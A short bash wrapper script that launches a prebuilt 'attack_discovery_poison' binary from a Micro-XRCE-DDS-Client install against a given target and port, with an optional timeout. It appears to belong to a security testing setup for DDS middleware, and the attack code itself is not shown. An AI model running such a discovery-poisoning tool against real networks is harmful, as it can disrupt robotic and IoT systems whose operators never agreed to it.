#!/usr/bin/env bash
if [ "${#}" -ge 1 ]; then
	TARGET="${1}"
    PORT="${2:-6666}"
    DURATION_S="${DURATION_S:-0}"
    if [ "${DURATION_S}" -gt 0 ]; then
        timeout "${DURATION_S}" /opt/Micro-XRCE-DDS-Client/bin/attack_discovery_poison "${TARGET}" "${PORT}"
    else
        /opt/Micro-XRCE-DDS-Client/bin/attack_discovery_poison "${TARGET}" "${PORT}"
    fi
fi
